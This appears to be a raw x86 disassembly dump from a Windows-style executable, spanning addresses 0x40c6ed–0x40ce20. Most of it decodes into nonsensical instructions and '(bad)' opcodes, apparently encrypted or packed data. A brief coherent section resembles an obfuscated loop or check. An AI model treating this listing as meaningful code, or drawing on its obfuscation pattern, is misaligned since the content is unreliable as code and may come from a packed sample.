  40c6ed:	add    bl,BYTE PTR [edi+0x6de6c10e]
  40c6f3:	in     eax,0xa4
  40c6f5:	call   0x425d:0xd21ed43
  40c6fc:	jb     0x40c703
  40c6fe:	mov    ds:0xcf39ce20,eax
  40c703:	fdivr  DWORD PTR [edi+esi*1+0x22]
  40c707:	mov    cl,0x4d
  40c709:	xchg   ebp,eax
  40c70a:	cmp    DWORD PTR [ebp-0x31],edi
  40c70d:	in     eax,dx
  40c70e:	jno    0x40c70d
  40c710:	add    esp,ebx
  40c712:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c713:	and    DWORD PTR [eax],esp
  40c715:	xor    eax,0xc308d47d
  40c71a:	mov    ds:0xe48354e6,eax
  40c71f:	ins    DWORD PTR es:[edi],dx
  40c720:	sub    eax,0xc814ad93
  40c725:	int3   
  40c726:	inc    eax
  40c727:	out    0x1,eax
  40c729:	xor    DWORD PTR ds:0x2050d49a,ecx
  40c72f:	jne    0x40c7ae
  40c731:	js     0x40c751
  40c733:	sub    DWORD PTR [esi],esp
  40c735:	imul   esp,DWORD PTR [ebx+eiz*8],0xe28ed369
  40c73c:	xor    eax,0x29d5fb97
  40c741:	jb     0x40c6d5
  40c743:	ret    
  40c744:	or     edx,edx
  40c746:	pop    eax
  40c747:	jnp    0x40c794
  40c749:	out    0x23,al
  40c74b:	cdq    
  40c74c:	sbb    eax,0x2f5ac990
  40c751:	shr    BYTE PTR [eax+0x44],1
  40c754:	test   al,0xb5
  40c756:	pushf  
  40c757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c758:	mov    ah,cl
  40c75a:	cmp    eax,0x25c02eff
  40c75f:	cwde   
  40c760:	retf   
  40c761:	jge    0x40c712
  40c763:	push   ebp
  40c764:	or     esi,0x21788011
  40c76a:	int3   
  40c76b:	xchg   esp,eax
  40c76c:	or     al,BYTE PTR [ebp+0x64b73cb8]
  40c772:	hlt    
  40c773:	aad    0xb3
  40c775:	mov    eax,ds:0x47bc5b24
  40c77a:	push   cs
  40c77b:	push   es
  40c77c:	jb     0x40c706
  40c77e:	repnz repz push DWORD PTR [ecx+0x19d76182]
  40c786:	in     eax,dx
  40c787:	cwde   
  40c788:	dec    bh
  40c78a:	mul    DWORD PTR [eax-0x2489bf52]
  40c790:	dec    ecx
  40c791:	shl    DWORD PTR [ecx],cl
  40c793:	or     al,0xb9
  40c795:	imul   esp,DWORD PTR [ecx],0xffffff90
  40c798:	addr16 add edx,esi
  40c79b:	aas    
  40c79c:	and    eax,0xbf28a7c0
  40c7a1:	(bad)  
  40c7a2:	jl     0x40c765
  40c7a4:	pop    edi
  40c7a5:	cmp    esi,DWORD PTR [ebp-0x3e]
  40c7a8:	test   al,0x48
  40c7aa:	sti    
  40c7ab:	adc    bh,ch
  40c7ad:	(bad)  
  40c7ae:	bound  edx,QWORD PTR [ecx]
  40c7b0:	xor    ch,bl
  40c7b2:	pminsw mm2,QWORD PTR [bp+di]
  40c7b6:	ins    DWORD PTR es:[edi],dx
  40c7b7:	rcl    BYTE PTR [edi],cl
  40c7b9:	(bad)  
  40c7ba:	loope  0x40c7bf
  40c7bc:	jns    0x40c7c5
  40c7be:	xchg   esi,eax
  40c7bf:	add    DWORD PTR [ebx+esi*1-0x36],ebx
  40c7c3:	sbb    DWORD PTR [ecx],edx
  40c7c5:	pusha  
  40c7c6:	mov    bl,BYTE PTR [edi-0x48b3d3f3]
  40c7cc:	std    
  40c7cd:	ja     0x40c76b
  40c7cf:	jle    0x40c809
  40c7d1:	push   eax
  40c7d2:	data16 mov bh,0x21
  40c7d5:	js     0x40c817
  40c7d7:	pop    ebp
  40c7d8:	sub    eax,ebp
  40c7da:	test   al,0x66
  40c7dc:	lods   eax,DWORD PTR ds:[esi]
  40c7dd:	pop    ss
  40c7de:	scas   al,BYTE PTR es:[edi]
  40c7df:	test   BYTE PTR [edi-0x6a],cl
  40c7e2:	jle    0x40c81c
  40c7e4:	sbb    DWORD PTR [edi+0x39],eax
  40c7e7:	mov    ah,0xc1
  40c7e9:	int    0xc6
  40c7eb:	fmulp  st(7),st
  40c7ed:	test   BYTE PTR ds:0x2f77,0x6c
  40c7f3:	daa    
  40c7f4:	ret    
  40c7f5:	and    BYTE PTR [edi],ch
  40c7f7:	pop    ecx
  40c7f8:	sbb    al,0x68
  40c7fa:	mov    esp,0x12a945a7
  40c7ff:	stos   BYTE PTR es:[edi],al
  40c800:	dec    ebp
  40c801:	cmp    dl,BYTE PTR [edi]
  40c803:	stc    
  40c804:	push   0x2e
  40c806:	cmp    al,0x5a
  40c808:	ret    
  40c809:	fist   WORD PTR [edx]
  40c80b:	mov    esp,0x48dac292
  40c810:	push   ecx
  40c811:	call   0xbd19:0x21a20917
  40c818:	push   eax
  40c819:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c81a:	test   eax,0x82315e50
  40c81f:	test   al,0x6e
  40c821:	xchg   al,dh
  40c823:	cs add eax,eax
  40c826:	push   esi
  40c827:	sbb    eax,0x31d6b22c
  40c82c:	gs jl  0x40c874
  40c82f:	cmp    BYTE PTR [eax+0x1ac91ee0],0x7a
  40c836:	pusha  
  40c837:	call   0x9514:0xa0258151
  40c83e:	push   edi
  40c83f:	in     eax,dx
  40c840:	push   cs
  40c841:	xchg   ebp,eax
  40c842:	stos   DWORD PTR es:[edi],eax
  40c843:	cdq    
  40c844:	out    dx,al
  40c845:	js     0x40c825
  40c847:	(bad)  
  40c848:	pop    ds
  40c849:	(bad)  
  40c84a:	fwait
  40c84b:	mov    eax,0xef6fdfd3
  40c850:	fisubr WORD PTR ds:0x496f3fd1
  40c856:	jo     0x40c88b
  40c858:	stos   DWORD PTR es:[edi],eax
  40c859:	mov    bh,0xd9
  40c85b:	dec    ebx
  40c85c:	pop    ss
  40c85d:	test   eax,0x59c037d7
  40c862:	adc    al,0xd1
  40c864:	call   0x224333d8
  40c869:	arpl   WORD PTR [edx+0x37],si
  40c86c:	cmp    ebp,DWORD PTR [esi+0x65]
  40c86f:	ss jae 0x40c8ce
  40c872:	pop    ds
  40c873:	dec    ebp
  40c874:	(bad)  
  40c875:	xchg   esi,eax
  40c876:	sahf   
  40c877:	inc    edi
  40c878:	cmp    bl,BYTE PTR [ebx]
  40c87a:	dec    DWORD PTR [ebx+0x5da31d7f]
  40c880:	mov    BYTE PTR [edx],ch
  40c882:	xor    eax,0xf5fc9f8b
  40c887:	mov    ch,0x9e
  40c889:	retf   0xe6d1
  40c88c:	nop
  40c88d:	test   al,0xd2
  40c88f:	cmp    al,0xaf
  40c891:	sub    cl,BYTE PTR ds:0x8f556470
  40c897:	mov    dl,0x98
  40c899:	call   0xa0d70a81
  40c89e:	mov    al,0xd5
  40c8a0:	push   ebp
  40c8a1:	pop    esi
  40c8a2:	mov    DWORD PTR [esi],ecx
  40c8a4:	outs   dx,DWORD PTR ds:[esi]
  40c8a5:	cmp    esp,0x7b424162
  40c8ab:	push   ecx
  40c8ac:	xor    ebx,DWORD PTR [eax]
  40c8ae:	(bad)  
  40c8af:	int3   
  40c8b0:	or     eax,0x48caf9da
  40c8b5:	cmc    
  40c8b6:	aam    0xe3
  40c8b8:	loop   0x40c90d
  40c8ba:	inc    eax
  40c8bb:	sti    
  40c8bc:	sahf   
  40c8bd:	mov    edx,0xa747ade8
  40c8c2:	inc    BYTE PTR [edx*4+0xd4e641f]
  40c8c9:	pop    ss
  40c8ca:	jp     0x40c8d0
  40c8cc:	xor    eax,DWORD PTR [ebp-0x1988afad]
  40c8d2:	xchg   BYTE PTR [esi],bl
  40c8d4:	addr16 push edi
  40c8d6:	bound  ecx,QWORD PTR [ecx+0x173ee59a]
  40c8dc:	xchg   ebp,eax
  40c8dd:	jbe    0x40c89f
  40c8df:	fiadd  DWORD PTR [edx]
  40c8e1:	jecxz  0x40c959
  40c8e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8e4:	dec    edi
  40c8e5:	fist   WORD PTR [edx-0x21458748]
  40c8eb:	aaa    
  40c8ec:	sub    ebx,DWORD PTR [esi-0x3a]
  40c8ef:	hlt    
  40c8f0:	mov    al,0x5
  40c8f2:	mul    BYTE PTR [eax+0x39]
  40c8f5:	jnp    0x40c927
  40c8f7:	(bad)  
  40c8f8:	and    al,ch
  40c8fa:	adc    DWORD PTR cs:[edi],esi
  40c8fd:	pop    ebp
  40c8fe:	outs   dx,BYTE PTR ds:[esi]
  40c8ff:	inc    edx
  40c900:	inc    esp
  40c901:	sbb    eax,DWORD PTR [esi]
  40c903:	iret   
  40c904:	push   ebp
  40c905:	xchg   ecx,eax
  40c906:	xchg   ebp,eax
  40c907:	int3   
  40c908:	popa   
  40c909:	arpl   WORD PTR [esi+edi*1],bx
  40c90c:	jno    0x40c911
  40c90e:	jbe    0x40c920
  40c910:	xlat   BYTE PTR ds:[ebx]
  40c911:	sbb    eax,0xd835e678
  40c916:	sub    esp,DWORD PTR [ecx+0x458bdba1]
  40c91c:	loopne 0x40c8a9
  40c91e:	push   ebp
  40c91f:	clc    
  40c920:	mov    edi,DWORD PTR [ebp-0x24]
  40c923:	xor    edx,ecx
  40c925:	add    edx,esi
  40c927:	imul   edx,edi
  40c92a:	sub    DWORD PTR [eax],edx
  40c92c:	mov    eax,DWORD PTR [ebp-0x14]
  40c92f:	jmp    0x40b5ea
  40c934:	mov    eax,DWORD PTR [ebp-0xc]
  40c937:	mov    edx,DWORD PTR [ebp-0x18]
  40c93a:	xor    eax,edx
  40c93c:	cmp    eax,0x7a0d5426
  40c941:	je     0x40b5e7
  40c947:	mov    eax,DWORD PTR [ebp-0x10]
  40c94a:	add    DWORD PTR [eax],0x7403502
  40c950:	jmp    0x40b5e7
  40c955:	mov    eax,DWORD PTR [ebp-0x1c]
  40c958:	jmp    0x40cc71
  40c95d:	rol    ebx,cl
  40c95f:	(bad)
  40c962:	leave  
  40c963:	rcr    ebx,1
  40c965:	mov    al,ds:0x3d4c5e53
  40c96a:	dec    ecx
  40c96b:	xlat   BYTE PTR ds:[ebx]
  40c96c:	mov    edi,0x78789d32
  40c971:	je     0x40c9f1
  40c973:	js     0x40c9ed
  40c975:	jle    0x40c95e
  40c977:	cmp    dh,BYTE PTR [ebx-0x27]
  40c97a:	jecxz  0x40c975
  40c97c:	adc    DWORD PTR [edi],eax
  40c97e:	or     dh,BYTE PTR [ecx]
  40c980:	jno    0x40c90a
  40c982:	call   0x2d915c8d
  40c987:	mov    ds:0xcac040f1,al
  40c98c:	mov    esp,0x120aee78
  40c991:	sbb    eax,edi
  40c993:	xor    al,0x33
  40c995:	ja     0x40c9ac
  40c997:	cmp    ebp,edi
  40c999:	icebp  
  40c99a:	add    al,0xe1
  40c99c:	stc    
  40c99d:	shr    BYTE PTR [esi+0x74],1
  40c9a0:	jg     0x40ca20
  40c9a2:	mov    dl,0x4
  40c9a4:	lock jge 0x40c99b
  40c9a7:	iret   
  40c9a8:	mov    al,0x44
  40c9aa:	int3   
  40c9ab:	inc    edi
  40c9ac:	rcr    BYTE PTR [ecx-0x37],cl
  40c9af:	push   ebx
  40c9b0:	cmc    
  40c9b1:	or     eax,0xca4ccdf7
  40c9b6:	pop    es
  40c9b7:	jl     0x40ca09
  40c9b9:	div    BYTE PTR [ebp-0x6bc5574a]
  40c9bf:	adc    al,0x25
  40c9c1:	mov    BYTE PTR [eax+0x5],bh
  40c9c4:	mov    ch,0x60
  40c9c6:	movlps QWORD PTR [esi-0xe],xmm2
  40c9ca:	add    ecx,DWORD PTR ds:0xb871f8aa
  40c9d0:	mov    edi,0xe9d69a67
  40c9d5:	adc    al,0xc8
  40c9d7:	out    dx,al
  40c9d8:	pop    ds
  40c9d9:	ret    0xa6ac
  40c9dc:	add    dh,BYTE PTR [eax+0x2b]
  40c9df:	sti    
  40c9e0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9e1:	outs   dx,BYTE PTR ds:[esi]
  40c9e2:	xchg   esi,eax
  40c9e3:	loop   0x40ca63
  40c9e5:	mov    edx,0x9ea1dadb
  40c9ea:	add    edx,DWORD PTR [ebx]
  40c9ec:	(bad)  
  40c9ed:	(bad)  
  40c9ee:	repz mov esp,0x753885f3
  40c9f4:	and    BYTE PTR [eax],cl
  40c9f6:	shl    BYTE PTR [edx+0x12],1
  40c9f9:	loope  0x40c97e
  40c9fb:	and    al,0x31
  40c9fd:	push   ebp
  40c9fe:	pop    ebp
  40c9ff:	push   esi
  40ca00:	repnz mov ebp,0x6f7a3244
  40ca06:	jne    0x40c9aa
  40ca08:	fld    QWORD PTR [edi-0x61e5fd1a]
  40ca0e:	xchg   bh,dh
  40ca10:	dec    ebp
  40ca11:	ins    BYTE PTR es:[edi],dx
  40ca12:	sub    DWORD PTR [ebx],edi
  40ca14:	sbb    ebx,edi
  40ca16:	aaa    
  40ca17:	sbb    eax,0x1868b78
  40ca1c:	inc    esi
  40ca1d:	cmp    BYTE PTR [edi-0xdb9c1d],al
  40ca23:	add    al,0x8d
  40ca25:	stos   DWORD PTR es:[edi],eax
  40ca26:	inc    eax
  40ca27:	push   esp
  40ca28:	and    eax,0x8eb76ec6
  40ca2d:	pop    edx
  40ca2e:	mov    dl,0x68
  40ca30:	das    
  40ca31:	sub    edi,DWORD PTR [edi]
  40ca33:	jg     0x40c9cf
  40ca35:	jne    0x40ca5b
  40ca37:	push   0xffffffff
  40ca39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ca3a:	adc    BYTE PTR [ecx+0x4722e19e],0x9e
  40ca41:	or     cl,BYTE PTR [ecx]
  40ca43:	mov    esp,0x23e65323
  40ca48:	and    bh,BYTE PTR [ecx]
  40ca4a:	mov    al,0xe4
  40ca4c:	iret   
  40ca4d:	and    al,0x5
  40ca4f:	push   ebp
  40ca50:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca51:	mov    DWORD PTR [edx+0x3e],ebx
  40ca54:	sub    al,0x51
  40ca56:	fcom   st(6)
  40ca58:	mov    edi,DWORD PTR [esi-0x69580887]
  40ca5e:	push   es
  40ca5f:	outs   dx,BYTE PTR ds:[esi]
  40ca60:	mov    ss,WORD PTR [ecx+0x6866bdd0]
  40ca66:	rcl    DWORD PTR [edx+0x65],cl
  40ca69:	sub    ch,BYTE PTR [ebp+ecx*2-0x630701c4]
  40ca70:	jae    0x40ca55
  40ca72:	xor    al,0xb0
  40ca74:	cdq    
  40ca75:	xchg   ecx,eax
  40ca76:	add    DWORD PTR [ecx],esi
  40ca78:	in     eax,0xe1
  40ca7a:	test   al,0xc6
  40ca7c:	cmp    BYTE PTR [edx+0x4d],0x22
  40ca80:	mov    bl,0xea
  40ca82:	bound  esp,QWORD PTR [ebx]
  40ca84:	cs xchg ecx,eax
  40ca86:	mov    al,0x3f
  40ca88:	inc    esi
  40ca89:	stos   BYTE PTR es:[edi],al
  40ca8a:	pushf  
  40ca8b:	cmp    eax,0xafba29
  40ca90:	and    edi,DWORD PTR [esi+eiz*2+0x6d2924ab]
  40ca97:	fadd   st,st(2)
  40ca99:	into   
  40ca9a:	retf   0xe49d
  40ca9d:	cmp    ah,dh
  40ca9f:	or     BYTE PTR [eax],ah
  40caa1:	nop
  40caa2:	mov    ebp,0x1020defb
  40caa7:	shl    BYTE PTR [eax],0xeb
  40caaa:	pop    ss
  40caab:	fldenv [edx-0x29]
  40caae:	adc    ah,bh
  40cab0:	or     bl,al
  40cab2:	add    DWORD PTR [ebp-0x7e875a01],edi
  40cab8:	and    eax,0x92cc6304
  40cabd:	lods   al,BYTE PTR ds:[esi]
  40cabe:	neg    BYTE PTR [esi]
  40cac0:	out    0xd0,eax
  40cac2:	cwde   
  40cac3:	aad    0xac
  40cac5:	jo     0x40ca9c
  40cac7:	imul   ebp,DWORD PTR [edx-0x7094fec8],0x31661a41
  40cad1:	jge    0x40cafa
  40cad3:	pop    edi
  40cad4:	aam    0x33
  40cad6:	jnp    0x40caba
  40cad8:	jge    0x40cb11
  40cada:	dec    esi
  40cadb:	xlat   BYTE PTR ds:[ebx]
  40cadc:	pop    esp
  40cadd:	fwait
  40cade:	push   es
  40cadf:	adc    cl,bh
  40cae1:	push   ebp
  40cae2:	push   edi
  40cae3:	jnp    0x40caba
  40cae5:	loopne 0x40cb1c
  40cae7:	add    DWORD PTR [eax-0x5e],ebx
  40caea:	cmc    
  40caeb:	mov    esp,0x58632980
  40caf0:	cld    
  40caf1:	push   ss
  40caf2:	out    0x31,al
  40caf4:	retf   0x2090
  40caf7:	mov    eax,0x9c4cc3f8
  40cafc:	xor    ah,ch
  40cafe:	add    cl,BYTE PTR [edi+0x67]
  40cb01:	pop    ebx
  40cb02:	cwde   
  40cb03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cb04:	mov    dl,0xfe
  40cb06:	out    0x49,al
  40cb08:	pop    ecx
  40cb09:	ret    0xfa9b
  40cb0c:	mov    DWORD PTR [eax-0x454ae338],eax
  40cb12:	stos   DWORD PTR es:[edi],eax
  40cb13:	inc    ebx
  40cb14:	pop    esi
  40cb15:	aas    
  40cb16:	push   edi
  40cb17:	push   0x6f7e112e
  40cb1c:	sbb    al,0x21
  40cb1e:	test   al,0x3a
  40cb20:	ds cmp al,0xdf
  40cb23:	int    0xdb
  40cb25:	mov    eax,0x94346491
  40cb2a:	in     eax,dx
  40cb2b:	repnz xchg edx,eax
  40cb2d:	jl     0x40cba3
  40cb2f:	shr    BYTE PTR [esi],1
  40cb31:	pop    ebx
  40cb32:	popf   
  40cb33:	cwde   
  40cb34:	xor    BYTE PTR [edx-0x52c143e3],0x6b
  40cb3b:	or     eax,0xbff27ea2
  40cb40:	pop    esi
  40cb41:	gs push ss
  40cb43:	jecxz  0x40cad4
  40cb45:	mov    al,0x9d
  40cb47:	scas   al,BYTE PTR es:[edi]
  40cb48:	xchg   ebp,eax
  40cb49:	out    0xff,al
  40cb4b:	ins    BYTE PTR es:[edi],dx
  40cb4c:	xchg   esp,eax
  40cb4d:	ins    BYTE PTR es:[edi],dx
  40cb4e:	call   0xbd1b:0x6a5014a4
  40cb55:	jnp    0x40cb72
  40cb57:	lahf   
  40cb58:	sahf   
  40cb59:	xor    eax,esp
  40cb5b:	push   ss
  40cb5c:	fsubr  DWORD PTR [ebp-0x65]
  40cb5f:	pop    ds
  40cb60:	xor    al,0xe4
  40cb62:	inc    edx
  40cb63:	hlt    
  40cb64:	or     al,0x92
  40cb66:	dec    eax
  40cb67:	jecxz  0x40cb19
  40cb69:	mov    eax,ds:0x203c7792
  40cb6e:	or     al,bh
  40cb70:	stc    
  40cb71:	mov    eax,0x1a00ad61
  40cb76:	(bad)  
  40cb77:	push   ebp
  40cb78:	pop    edx
  40cb79:	add    BYTE PTR [edx-0x35],cl
  40cb7c:	in     eax,dx
  40cb7d:	adc    DWORD PTR [ebp-0x2d5b03a8],ebx
  40cb83:	sub    BYTE PTR [esi-0x2b4293d1],ah
  40cb89:	or     BYTE PTR ds:0xa7cbcc74,ch
  40cb8f:	xchg   edi,eax
  40cb90:	scas   al,BYTE PTR es:[edi]
  40cb91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb92:	test   dh,0x5f
  40cb95:	ficomp WORD PTR ds:0xaa2a42f4
  40cb9b:	scas   eax,DWORD PTR es:[edi]
  40cb9c:	ret    0x3af2
  40cb9f:	adc    dh,BYTE PTR [esi-0x76]
  40cba2:	ins    BYTE PTR es:[edi],dx
  40cba3:	and    BYTE PTR [eax-0x2ca3507a],0xc8
  40cbaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cbab:	inc    eax
  40cbac:	add    DWORD PTR [ecx],0xf37c852a
  40cbb2:	xor    BYTE PTR [edx+0x75],ah
  40cbb5:	xor    ebp,DWORD PTR [ebx+0x6d6a55df]
  40cbbb:	jge    0x40cbdd
  40cbbd:	xor    ch,BYTE PTR [edi]
  40cbbf:	mov    ebx,0xbcd452d7
  40cbc4:	pop    DWORD PTR [ecx-0x4bfca575]
  40cbca:	pushf  
  40cbcb:	loope  0x40cbc0
  40cbcd:	(bad)  
  40cbce:	dec    BYTE PTR [ecx+0x67e37d85]
  40cbd4:	or     al,0x65
  40cbd6:	pop    ds
  40cbd7:	jne    0x40cbaa
  40cbd9:	ss jae 0x40cc27
  40cbdc:	(bad)  
  40cbdd:	push   esp
  40cbde:	je     0x40cb64
  40cbe0:	pop    ecx
  40cbe1:	loopne 0x40cb6a
  40cbe3:	sbb    dl,ah
  40cbe5:	mov    esp,0x442d4d0
  40cbea:	inc    ebx
  40cbeb:	loop   0x40cba3
  40cbed:	aad    0x4e
  40cbef:	jle    0x40cbb7
  40cbf1:	sbb    dh,bl
  40cbf3:	sub    DWORD PTR [ebx-0x2e187a09],esi
  40cbf9:	jmp    0xfa313ef5
  40cbfe:	hlt    
  40cbff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc00:	popf   
  40cc01:	dec    ecx
  40cc02:	and    DWORD PTR [ecx-0x7a],edi
  40cc05:	inc    eax
  40cc06:	jmp    0xd317:0xca4e2696
  40cc0d:	dec    ebx
  40cc0e:	scas   eax,DWORD PTR es:[edi]
  40cc0f:	push   esp
  40cc10:	ret    0x972f
  40cc13:	lods   eax,DWORD PTR ds:[esi]
  40cc14:	adc    bh,BYTE PTR [ecx-0x67f8f815]
  40cc1a:	add    edx,DWORD PTR [edx-0x45]
  40cc1d:	daa    
  40cc1e:	inc    edx
  40cc1f:	add    bl,BYTE PTR [eax-0x28023a5a]
  40cc25:	loop   0x40cc11
  40cc27:	fbstp  TBYTE PTR [esi]
  40cc29:	xchg   edi,eax
  40cc2a:	fdiv   QWORD PTR [edx]
  40cc2c:	adc    DWORD PTR [edi+0x4569697e],esi
  40cc32:	xchg   ebx,eax
  40cc33:	imul   esp,DWORD PTR [ebp-0x55122c3b],0x1ecd6d9d
  40cc3d:	mov    ah,0xf
  40cc3f:	mov    fs,WORD PTR [edx]
  40cc41:	pop    edi
  40cc42:	test   al,0x43
  40cc44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc45:	adc    ebp,DWORD PTR [ebp+eiz*1-0x78b82882]
  40cc4c:	mov    BYTE PTR [ebp+0x27],ah
  40cc4f:	cmp    eax,0xace3962e
  40cc54:	sbb    eax,esp
  40cc56:	push   ss
  40cc57:	pop    esi
  40cc58:	cmp    eax,0xe04e7ab1
  40cc5d:	cmp    BYTE PTR [esi+0x650a2666],dl
  40cc63:	mov    BYTE PTR [edx-0x5394e0c3],dh
  40cc69:	icebp  
  40cc6a:	jne    0x40cc25
  40cc6c:	xor    eax,0x84ad4cc1
  40cc71:	cmp    DWORD PTR [eax],edi
  40cc73:	jmp    0x40cf8c
  40cc78:	(bad)  
  40cc79:	(bad)  
  40cc7a:	rol    esp,1
  40cc7c:	ror    ebx,1
  40cc7e:	aad    0xda
  40cc80:	xchg   esi,eax
  40cc81:	mov    dl,0x71
  40cc83:	aad    0x24
  40cc85:	and    DWORD PTR [edx],ecx
  40cc87:	aaa    
  40cc88:	mov    cs:0x7e747878,al
  40cc8e:	js     0x40cd08
  40cc90:	lar    esi,WORD PTR ds:0x9805811e
  40cc97:	push   cs
  40cc98:	sub    bh,BYTE PTR [edi+0x5231135b]
  40cc9e:	push   ss
  40cc9f:	sbb    BYTE PTR [ebx+0x71bb80cd],dh
  40cca5:	ins    DWORD PTR es:[edi],dx
  40cca6:	sub    al,0x5a
  40cca8:	fcomip st,st(4)
  40ccaa:	call   0x808a:0xd63d8d96
  40ccb1:	sahf   
  40ccb2:	inc    ebp
  40ccb3:	ds mov esp,0x515bb3a5
  40ccb9:	in     al,0xb9
  40ccbb:	push   ebx
  40ccbc:	lock sub al,0xd2
  40ccbf:	fmulp  st(5),st
  40ccc1:	imul   edi,eax,0xfffffffb
  40ccc4:	pop    ss
  40ccc5:	add    cl,0xf6
  40ccc8:	loop   0x40ccac
  40ccca:	cli    
  40cccb:	or     esp,DWORD PTR [ecx-0x5a]
  40ccce:	xor    DWORD PTR [edi+0x76],esp
  40ccd1:	stos   DWORD PTR es:[edi],eax
  40ccd2:	hlt    
  40ccd3:	sbb    bl,dl
  40ccd5:	stos   BYTE PTR es:[edi],al
  40ccd6:	ret    0xbbe8
  40ccd9:	dec    esi
  40ccda:	in     al,dx
  40ccdb:	cdq    
  40ccdc:	aam    0x1b
  40ccde:	call   0x30c980d
  40cce3:	xchg   esi,eax
  40cce4:	and    bh,BYTE PTR [edx-0x5c16059d]
  40ccea:	mov    al,ds:0xe219fd3b
  40ccef:	mov    esp,0xde35e6b7
  40ccf4:	mov    ah,0x61
  40ccf6:	test   BYTE PTR [edx+0x9fe8c46],bl
  40ccfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccfd:	push   es
  40ccfe:	lahf   
  40ccff:	into   
  40cd00:	and    DWORD PTR [ebp-0x3dd5e40d],esi
  40cd06:	iret   
  40cd07:	xchg   edi,eax
  40cd08:	int3   
  40cd09:	mov    ebx,0xb019bdfa
  40cd0e:	push   edx
  40cd0f:	stos   DWORD PTR es:[edi],eax
  40cd10:	out    0x58,eax
  40cd12:	mov    ?,esp
  40cd14:	sbb    DWORD PTR [edx-0x26f9a39f],edx
  40cd1a:	adc    al,0xef
  40cd1c:	dec    ebx
  40cd1d:	cmp    al,0x8a
  40cd1f:	adc    ch,BYTE PTR [edx+eax*2+0x166ebb11]
  40cd26:	(bad)
  40cd29:	call   0xf7d2579e
  40cd2e:	aas    
  40cd2f:	mov    ah,cl
  40cd31:	mov    edx,0xda6440bf
  40cd36:	out    0xc3,eax
  40cd38:	aad    0x89
  40cd3a:	cmp    ch,bh
  40cd3c:	xchg   DWORD PTR [ebx+eax*1-0x7930ce88],ecx
  40cd43:	addr16 jmp 0x18c93dea
  40cd49:	test   eax,0x8b3efc15
  40cd4e:	test   cl,al
  40cd50:	pop    ecx
  40cd51:	cmp    bh,dl
  40cd53:	hlt    
  40cd54:	std    
  40cd55:	push   cs
  40cd56:	xchg   esp,eax
  40cd57:	add    al,0xf1
  40cd59:	loop   0x40cdcd
  40cd5b:	loope  0x40cdac
  40cd5d:	pusha  
  40cd5e:	inc    ecx
  40cd5f:	mov    eax,0xbd34bcca
  40cd64:	xchg   ebx,eax
  40cd65:	and    BYTE PTR [ebx+0x22],dl
  40cd68:	pop    edx
  40cd69:	mov    edi,0xe752a5c5
  40cd6e:	pusha  
  40cd6f:	mov    cl,0x38
  40cd71:	xchg   edi,eax
  40cd72:	je     0x40cd31
  40cd74:	or     BYTE PTR [eax-0x6b],al
  40cd77:	sbb    ch,bl
  40cd79:	xor    bx,WORD PTR [edx]
  40cd7c:	lods   al,BYTE PTR ds:[esi]
  40cd7d:	pusha  
  40cd7e:	cmp    DWORD PTR [eax],ebp
  40cd80:	mov    edx,0xec0ea4db
  40cd85:	or     edi,DWORD PTR [ebx-0x572c5789]
  40cd8b:	xor    al,0xdd
  40cd8d:	mov    cl,0xd0
  40cd8f:	stos   DWORD PTR es:[edi],eax
  40cd90:	sbb    eax,0xe131e5aa
  40cd95:	push   ds
  40cd96:	adc    bl,BYTE PTR [edx+0xf]
  40cd99:	setg   BYTE PTR [esi+eiz*8]
  40cd9d:	xor    al,0x75
  40cd9f:	push   esi
  40cda0:	ret    
  40cda1:	pop    ds
  40cda2:	dec    eax
  40cda3:	xchg   edx,eax
  40cda4:	mul    BYTE PTR [eax+eiz*2+0x187cdd39]
  40cdab:	repz repnz xlat BYTE PTR ds:[ebx]
  40cdae:	jmp    0x40cdd7
  40cdb0:	dec    edi
  40cdb1:	(bad)  
  40cdb2:	not    DWORD PTR [esi]
  40cdb4:	xchg   edi,eax
  40cdb5:	xlat   BYTE PTR ds:[ebx]
  40cdb6:	clc    
  40cdb7:	int    0x86
  40cdb9:	cmp    eax,ecx
  40cdbb:	mov    dl,BYTE PTR [ebx+0x3c9b18de]
  40cdc1:	sub    al,0xc5
  40cdc3:	pop    eax
  40cdc4:	aaa    
  40cdc5:	scas   eax,DWORD PTR es:[edi]
  40cdc6:	stos   DWORD PTR es:[edi],eax
  40cdc7:	dec    esi
  40cdc8:	enter  0xdae8,0xce
  40cdcc:	add    BYTE PTR ds:0x3bd7dbef,bh
  40cdd2:	test   DWORD PTR [ebp-0x32],esp
  40cdd5:	cwde   
  40cdd6:	in     al,dx
  40cdd7:	fwait
  40cdd8:	mov    dl,0x27
  40cdda:	cmp    bh,BYTE PTR [ebp+0xd]
  40cddd:	iret   
  40cdde:	add    al,0x8d
  40cde0:	std    
  40cde1:	add    DWORD PTR [ecx+0x27aa14ce],eax
  40cde7:	or     BYTE PTR [edx],bh
  40cde9:	das    
  40cdea:	mov    cl,0x17
  40cdec:	ja     0x40cdda
  40cdee:	les    esi,FWORD PTR ds:0x5e4f80f0
  40cdf4:	xor    bh,dl
  40cdf6:	imul   ebp,DWORD PTR [eax-0x5f],0xffffff8d
  40cdfa:	mov    cl,0xb8
  40cdfc:	(bad)  
  40cdfd:	fdivr  DWORD PTR [edi+0xb]
  40ce00:	scas   al,BYTE PTR es:[edi]
  40ce01:	jg     0x40cdf8
  40ce03:	pop    ebp
  40ce04:	cmc    
  40ce05:	add    ch,ch
  40ce07:	mov    ebx,0xbb2ac491
  40ce0c:	scas   al,BYTE PTR es:[edi]
  40ce0d:	sbb    eax,0xd4bc944b
  40ce12:	out    dx,al
  40ce13:	clc    
  40ce14:	dec    edx
  40ce15:	repnz and bh,dl
  40ce18:	outs   dx,BYTE PTR ds:[esi]
  40ce19:	lea    ebx,[edx]
  40ce1b:	and    BYTE PTR [esi],ch
  40ce1d:	mov    WORD PTR [ecx],?
  40ce1f:	push   esp
  40ce20:	sub    bl,BYTE PTR [eax+0x4811c982]
